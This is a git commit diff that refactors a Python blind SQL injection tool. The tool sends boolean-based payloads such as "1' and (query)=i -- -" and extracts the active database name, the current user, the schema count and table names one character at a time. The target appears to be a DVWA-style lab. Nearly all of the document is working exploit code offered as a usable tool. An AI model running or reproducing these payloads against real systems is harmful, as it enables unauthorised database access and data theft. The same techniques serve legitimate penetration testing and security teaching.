792b8071eb1c5c7e176531038ecf97d133e2e03f
Hugo Barea <bareamorenohugo@gmail.com>
2025-02-23 10:39:40 +0100

    Refactor code for cleanliness

--- blind_sqli.py
+++ blind_sqli.py
@@ -3,7 +3,6 @@
 import argparse
 import requests
 
-
 def main():
 
 	global url
@@ -24,19 +23,21 @@ def main():
 	r = requests.get(url, cookies=cookies)
 	
 	if r is not None:
-		print("--> Target is awake")
+		print("--> Target is awake\n")
 
 	if argv['activedb']:
 		print(f"\n--> Active db: {''.join(find_active_db())}")
 	
 	if argv['activeuser']:
-		print(f"\n--> Active user: {''.join(find_user())}")
+		print(f"\n--> Active user: {''.join(find_user()).lower()}")
 
 	if argv['ndbs']:
 		print(f"\n--> {find_n_db()} dbs found")
 	
+	if argv['db']:
+		print(f"Dumping {argv['db']}...")
 
-	#find_db()
+		dump_db(argv['db'])
 
 
 def parse_cookies(argv):
@@ -54,7 +55,7 @@ def parse_arguments():
 	parser = argparse.ArgumentParser()
 	dump_group = parser.add_argument_group('DUMP')
 
-	parser.add_argument('-u', metavar='target', type=str, nargs='+', help = 'The endpoint you want to run the script over')
+	parser.add_argument('-u', metavar='target', type=str, nargs='+', help = 'Mark injectable parameters with a wildcard e.g. ?id=*')
 	parser.add_argument('--cookies', type=str, help = 'e.g. "PHPSESSID=value"')
 	parser.add_argument('--data', type=str, help ='Sent over POST (e.g. user=1&pass=1)')
 
@@ -66,100 +67,111 @@ def parse_arguments():
 	dump_group.add_argument('--db', type=str, help = 'Dump specified db')
 	dump_group.add_argument('--lfi', metavar='FILE', type=str, help = 'Attempt to dump file')
 
-	args = parser.parse_args()
-	argv = vars(args)
+	return vars(parser.parse_args())
 
-	return argv
 
 def find_active_db() -> str:
-	db_len = 0
-	db_name = []
-	i = 1
 
-	print("--> Encontrando longitud de la base de datos activa...")
-	r = requests.get(url + payload, cookies=cookies)
+	print("--> Finding length of active DB name...")
+	db_len = find_query_length("select length(database())")
 
-	# Sacar longitud del nombre
-	while "First name" not in r.text:
-		r = requests.get(f"{url}1' and (select length(database()))={i} -- -&Submit=Submit#", cookies=cookies)
-		size = len(r.text)
-		i += 1
+	print(f"--> Active DB's name has {db_len} characters")
+	print("--> Dumping active DB name...")
 
-	db_len = i - 1
+	return find_query_string("select substring(database(),*,1)", db_len)
 
-	print(f"--> La base de datos activa tiene {db_len} carácteres")
 
-	print("--> Sacando nombre de la base de datos...")
-
-	# Sacar nombre de bbdd
-
-	i = 1
-	char = 0
-
-	while i <= db_len:
-		r = requests.get(f"{url}1' and (select substring(database(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)
-
-		if "First name" in r.text:
-			db_name.append(chr(char))
-			print(f"\r{''.join(db_name)}", end='')
-			i += 1
-			char = 0
-		else:
-			char += 1
-
-	return db_name
 
 def find_user() -> str:
-	user_len = 0
-	user_name = []
-	i = 1
 
-	print("--> Encontrando longitud de usuario activo...")
-	r = requests.get(url + payload, cookies=cookies)
+	user_len = find_query_length("select length(user())")
 
-	# Sacar longitud del nombre
-	while "First name" not in r.text:
-		r = requests.get(f"{url}1' and (select length(user()))={i} -- -&Submit=Submit#", cookies=cookies)
-		size = len(r.text)
-		i += 1
+	print(f"--> Active user has {user_len} characters")
+	print("--> Printing active user...")
 
-	user_len = i - 1
-
-	print(f"--> El usuario activo tiene {user_len} carácteres")
-
-	print("--> Sacando nombre del usuario activo...")
-
-	i = 1
-	char = 0
-
-	while i <= user_len:
-		r = requests.get(f"{url}1' and (select substring(user(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)
-
-		if "First name" in r.text:
-			user_name.append(chr(char))
-			print(f"\r{''.join(user_name)}", end='')
-			i += 1
-			char = 0
-		else:
-			char += 1
-
-	return user_name
+	return find_query_string("select substring(user(),*,1)", user_len)
 
 
 def find_n_db() -> int:
+	return find_query_count("select count(schema_name) from information_schema.schemata")
 
+
+def dump_db(db_name) -> None:
+	
+	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
+	tables = find_query_string(f"select substring(group_concat(table_name),*,1) from information_schema.tables where table_schema='{db_name}'", concat_len)
+	
+	tables = tables.split(",")
+	for table in tables:
+		print(table) 
+
+def dump_table(table_name, db_name):
+	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
+
+
+def find_query_count(query):
 	i = 0
-	r = requests.get(url + payload, cookies=cookies)
+	r_base = requests.get(url + payload, cookies=cookies)
+	r = r_base
 
-	while "First name" not in r.text:
+	while r_base.text == r.text:
 		i += 1
-		r = requests.get(f"{url}1' and (select count(schema_name) from information_schema.schemata)={i} -- -&Submit=Submit#", cookies=cookies)
+		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
 		size = len(r.text)
 		
 	return i
 
-	# 1' and (select count(schema_name) from information_schema.schemata)=1 -- -
+def find_query_length(query):
+	res_text = []
+	i = 1
 
+	r_base = requests.get(url + payload, cookies=cookies)
+	r = r_base
+
+	# Sacar longitud de la query
+	while r.text == r_base.text:
+		r = requests.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
+		size = len(r.text)
+		i += 1
+
+	return i - 1
+
+def find_query_string(query, query_len):
+	char = 0
+	i = 1
+	query_res = []
+
+	r_base = requests.get(url + payload, cookies=cookies)
+	r = r_base
+	
+	while i <= query_len:
+		
+		r = requests.get(f"{url}1' and ({query.replace("*", str(i))})='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)
+
+		if r.text != r_base.text:
+			query_res.append(chr(char))
+			print(f"\r{''.join(query_res).lower()}", end='')		
+			i += 1
+			char = 0
+		else:
+			char += 1
+	print("\n")
+
+	return ''.join(query_res).lower()
+
+def print_banner():
+	text = r"""
+   __            ___            
+  / /  ___ ___ _/ (_) ___  __ __
+ / _ \(_-</ _ `/ / / / _ \/ // /
+/_.__/___/\_, /_/_(_) .__/\_, / 
+           /_/     /_/   /___/  
+"""
+	print(text)
+	print(" A blind SQL injection exploitation tool")
+	print(" By Hugo Barea")
+	print(" https://github.com/hugobarea/bsqli_scan\n\n")
 
 if __name__ == '__main__':
+	print_banner()
 	main()
